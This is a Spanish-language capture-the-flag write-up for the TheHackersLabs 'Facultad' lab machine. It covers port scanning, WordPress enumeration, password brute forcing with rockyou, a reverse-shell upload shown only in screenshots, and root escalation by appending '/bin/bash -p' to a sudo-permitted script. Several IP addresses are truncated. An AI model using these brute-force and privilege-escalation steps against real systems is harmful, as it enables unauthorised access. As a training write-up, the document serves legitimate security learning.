

# **Writeup: TheHackersLabs - Facultad**

---

## **🔍 Reconocimiento**

### **Escaneo de puertos con Nmap**
```bash
sudo nmap -sS -p- --open --min-rate 5000 -T5 -vvv -n -Pn -oG allPorts
```

**Resultados:**
- **Puertos abiertos:**
  - `22/tcp` → **SSH** (OpenSSH 9.2p1 Debian)
  - `80/tcp` → **HTTP** (Apache 2.4.62)
- **MAC Address:** `08:00:27:4C:79:01` (Oracle VirtualBox)
- **Sistema operativo:** Linux (Debian)

---

## **🔎 Enumeración de puertos y versiones**
```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 -oN target
```

**Resultados:**
- **SSH:**
  - Versión: `OpenSSH 9.2p1 Debian 2+deb12u3`
  - Claves SSH:
    - ECDSA: `af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64`
    - ED25519: `6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5`
- **HTTP:**
  - Servidor: `Apache/2.4.62 (Debian)`
  - Título: `Administración de Sistemas - Ingeniería Informática`
<img width="1184" height="643" alt="image" src="https://github.com/user-attachments/assets/986699ce-3486-42a3-a662-6229c0df0bd8" />

---

## **🌐 Identificación de dominio**
Se agregó la entrada al archivo `/etc/hosts` para resolver el nombre de dominio:
```bash
192.168 facultad.thl
192.168 http://facultad.thl
```

---

## **📂 Enumeración de directorios web**
```bash
gobuster dir -u http://192.168/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak
```

**Directorios encontrados:**
- `/index.html` → Código 200 (4651 bytes)
- `/images/` → Redirección 301
- `/education/` → Redirección 301 (¡Directorio WordPress!)
- `/server-status` → Código 403 (Acceso denegado)

---

## **🔑 Análisis de WordPress con WPScan**
```bash
wpscan --url http://192.168/education/ --enumerate u,vp
```

**Hallazgos:**
- **WordPress 6.7.1** (Versión insegura, liberada en noviembre de 2024).
- **XML-RPC habilitado** → Posible vector de ataque.
- **Usuario identificado:** `facultad`

---

## **💥 Fuerza bruta para credenciales**
```bash
wpscan --url http://192.168/education/ --passwords /usr/share/wordlists/rockyou.txt --usernames facultad
```

**Credenciales obtenidas:**
- **Usuario:** `facultad`
- **Contraseña:** `asdfghjkl`

---
<img width="1177" height="572" alt="image" src="https://github.com/user-attachments/assets/9d6832db-eff6-40d1-a75e-921354e076b7" />
<img width="1178" height="572" alt="image" src="https://github.com/user-attachments/assets/6d43e2c2-6253-448c-921b-e6c9e7b6dbbb" />

Subimos la revershell y nosponemos en escucha con nc
<img width="1176" height="611" alt="image" src="https://github.com/user-attachments/assets/b28d032a-503f-4a51-a42b-5b3515099876" />

<img width="1178" height="570" alt="image" src="https://github.com/user-attachments/assets/41edcc84-7fd9-44f9-b99c-f59d2f4137bf" />

## **🔓 Acceso inicial por SSH**
```bash
ssh vivian@192.168
```
**Credenciales:**
- **Usuario:** `vivian`
- **Contraseña:** `asdfghjkl`

**Primera flag obtenida:** `xxxxxxxxxxxxxxx`

---

## **🚀 Escalada de privilegios**

### **1. Verificación de permisos con `sudo -l`**
```bash
sudo -l
```
**Resultado:**
```bash
Matching Defaults entries for vivian on TheHackersLabs-facultad:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User vivian may run the following commands on TheHackersLabs-facultad:
    (ALL) NOPASSWD: /opt/vivian/script.sh
```
<img width="1174" height="641" alt="image" src="https://github.com/user-attachments/assets/03afaa0a-8d5a-4adf-89ce-cbf6d55813fa" />

### **2. Explotación del script vulnerable**
El usuario `vivian` puede ejecutar `/opt/vivian/script.sh` como **root** sin contraseña.

**Modificación del script para escalar privilegios:**
```bash
echo "/bin/bash -p" >> /opt/vivian/script.sh
```

**Ejecución:**
```bash
sudo /opt/vivian/script.sh
```

**Resultado:**
```bash
root@TheHackersLabs-facultad:/opt/vivian# whoami
root
```

### **3. Obtención de la flag de root**
```bash
cd /root
ls
cat root.txt
```
**Flag de root obtenida:** `xxxxxxxxxxxxxxx`
<img width="1173" height="347" alt="image" src="https://github.com/user-attachments/assets/98755b5d-9ba4-4b7f-bf83-0b13a4856582" />

---

## **📌 Resumen del ataque**
| **Fase**               | **Herramienta/Comando**                     | **Resultado**                     |
|------------------------|---------------------------------------------|-----------------------------------|
| **Reconocimiento**     | `nmap -sS -p-`                              | Puertos 22 y 80 abiertos          |
| **Enumeración**        | `nmap -sCV -p22,80`                         | SSH (OpenSSH 9.2p1) y HTTP (Apache 2.4.62) |
| **Enumeración web**    | `gobuster`                                  | Directorio `/education/` encontrado |
| **Análisis WordPress** | `wpscan --enumerate u,vp`                   | Usuario `facultad` identificado   |
| **Fuerza bruta**       | `wpscan --passwords rockyou.txt`            | Credenciales: `facultad:asdfghjkl`|
| **Acceso SSH**         | `ssh vivian@192.168.80.96`                  | Primera flag obtenida              |
| **Escalada**           | `sudo -l` → Modificación de `/opt/vivian/script.sh` | Acceso root |

---
**🎯 Conclusión:**
Se explotó un **WordPress desactualizado**, se realizó **fuerza bruta** para obtener credenciales, y se escaló privilegios mediante un **script vulnerable** en `/opt/vivian/script.sh`.

**🔐 Recomendaciones:**
- Actualizar WordPress y plugins.
- Deshabilitar XML-RPC si no es necesario.
- Revisar permisos de scripts en `/opt/`.
- Usar contraseñas más seguras que `asdfghjkl`.
